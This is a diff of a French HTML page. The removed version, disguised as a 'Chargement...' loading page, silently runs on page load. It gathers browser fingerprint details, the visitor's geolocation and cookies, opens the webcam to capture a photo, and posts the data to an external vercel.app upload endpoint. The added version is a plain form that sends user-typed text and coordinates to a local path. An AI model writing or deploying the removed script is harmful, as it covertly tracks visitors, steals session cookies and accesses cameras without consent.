@@ -1,116 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chargement...</title>
+  <title>Envoi de données au serveur</title>
 </head>
 <body>
+  <textarea id="textInput"></textarea>
+  <input type="text" id="latitude" placeholder="Latitude">
+  <input type="text" id="longitude" placeholder="Longitude">
+  <button onclick="sendData()">Envoyer</button>
 
-    <script>
-        // Fonction pour récupérer les informations du navigateur
-        function getBrowserInfo() {
-            let info = {
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
-                userAgent: navigator.userAgent,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                maxTouchPoints: navigator.maxTouchPoints,
-                deviceMemory: navigator.deviceMemory
-            };
-            return info;
-        }
+  <script>
+    function sendData() {
+      const latitude = document.getElementById('latitude').value;
+      const longitude = document.getElementById('longitude').value;
 
-        // Fonction pour récupérer la localisation
-        function getLocation(callback) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        let location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        callback(location);
-                    },
-                    error => {
-                        console.error('Erreur de géolocalisation:', error);
-                        callback(null);
-                    }
-                );
-            } else {
-                console.error("La géolocalisation n'est pas supportée par ce navigateur.");
-                callback(null);
-            }
-        }
+      const data = {
+        content: document.getElementById('textInput').value,
+        latitude: latitude,
+        longitude: longitude
+      };
 
-        // Fonction pour récupérer les cookies
-        function getCookies() {
-            let cookies = document.cookie;
-            return cookies;
-        }
-
-        // Fonction pour prendre une photo
-        function takePhoto(callback) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    let video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-
-                    let canvas = document.createElement('canvas');
-                    canvas.width = 640; // largeur de la capture
-                    canvas.height = 480; // hauteur de la capture
-
-                    setTimeout(() => {
-                        let context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let photoData = canvas.toDataURL('image/png');
-                        callback(photoData);
-                        stream.getTracks().forEach(track => track.stop()); // Arrêter le flux vidéo
-                    }, 2000); // Attendre 2 secondes avant de capturer l'image
-                })
-                .catch(error => {
-                    console.error('Erreur lors de la capture de la photo:', error);
-                    callback(null);
-                });
-        }
-
-        // Fonction pour envoyer les données au serveur
-        function sendData(data) {
-            fetch('https://citation-fb-chatgpt-2.vercel.app/upload', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Données envoyées:', data))
-            .catch(error => console.error('Erreur lors de l\'envoi des données:', error));
-        }
-
-        // Fonction principale pour collecter et envoyer les données
-        function collectAndSendData() {
-            let browserInfo = getBrowserInfo();
-            let cookies = getCookies();
-
-            getLocation(location => {
-                takePhoto(photo => {
-                    let data = {
-                        browserInfo: browserInfo,
-                        location: location,
-                        cookies: cookies
-                        //photo: photo
-                    };
-                    sendData(data);
-                });
-            });
-        }
-
-        // Collecter et envoyer les données lorsque la page est chargée
-        window.onload = collectAndSendData;
-    </script>
+      fetch('/upload', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => console.log('Réponse du serveur:', data))
+      .catch(error => console.error('Erreur:', error));
+    }
+  </script>
 </body>
 </html>
